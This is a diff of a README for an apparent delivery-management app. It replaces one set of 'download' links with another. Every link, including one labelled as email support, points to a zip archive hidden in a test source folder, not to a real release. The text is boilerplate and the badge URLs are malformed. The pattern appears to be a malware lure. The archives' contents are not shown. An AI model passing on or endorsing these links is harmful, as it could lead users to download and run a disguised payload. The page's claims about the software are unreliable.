@@ -1,7 +1,7 @@
 # 🚚 Multi-Vendor-Micro-Delivery-System - Simplifying Your Delivery Experience
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/order-service/src/test/java/com/example/order_service/System_Vendor_Delivery_Multi_Micro_2.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/order-service/src/test/java/com/example/order_service/System_Vendor_Delivery_Multi_Micro_2.7.zip)
+[![Download](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/geofence-service/src/test/java/com/example/Micro_Vendor_Multi_Delivery_System_2.8.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/geofence-service/src/test/java/com/example/Micro_Vendor_Multi_Delivery_System_2.8.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Multi-Vendor-Micro-Delivery-System application. This app helps manage deliveries in real-time, with features like geofencing and order tracking.
@@ -16,7 +16,7 @@ Before you start, ensure your computer meets the following requirements:
 - **Network:** An active internet connection.
 
 ## 💾 Download & Install
-To get the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/order-service/src/test/java/com/example/order_service/System_Vendor_Delivery_Multi_Micro_2.7.zip).
+To get the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/geofence-service/src/test/java/com/example/Micro_Vendor_Multi_Delivery_System_2.8.zip).
 
 1. Click the link above to go to the Releases page of the repository.
 2. Look for the latest version.
@@ -51,7 +51,7 @@ If you encounter any issues, help is available.
 
 - **FAQ Section:** Check the FAQ section on our GitHub page for common questions.
 - **Issue Tracker:** Report issues directly on the GitHub repository.
-- **Email Support:** You can contact us at https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/order-service/src/test/java/com/example/order_service/System_Vendor_Delivery_Multi_Micro_2.7.zip for further assistance.
+- **Email Support:** You can contact us at https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/geofence-service/src/test/java/com/example/Micro_Vendor_Multi_Delivery_System_2.8.zip for further assistance.
 
 ## 📣 Community and Contributions
 We welcome contributions and feedback. You can participate in discussions and suggest features by using the issue tracker on GitHub.
@@ -72,4 +72,4 @@ For best results, keep the app updated to the latest version. This ensures you h
 ## 🤝 Acknowledgments
 We appreciate the contributions of the developer community for making this project possible. Special thanks to those who provided valuable feedback and suggestions.
 
-[![Download](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/order-service/src/test/java/com/example/order_service/System_Vendor_Delivery_Multi_Micro_2.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/order-service/src/test/java/com/example/order_service/System_Vendor_Delivery_Multi_Micro_2.7.zip)
+[![Download](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/geofence-service/src/test/java/com/example/Micro_Vendor_Multi_Delivery_System_2.8.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Ninja99990/Multi-Vendor-Micro-Delivery-System/main/geofence-service/src/test/java/com/example/Micro_Vendor_Multi_Delivery_System_2.8.zip)
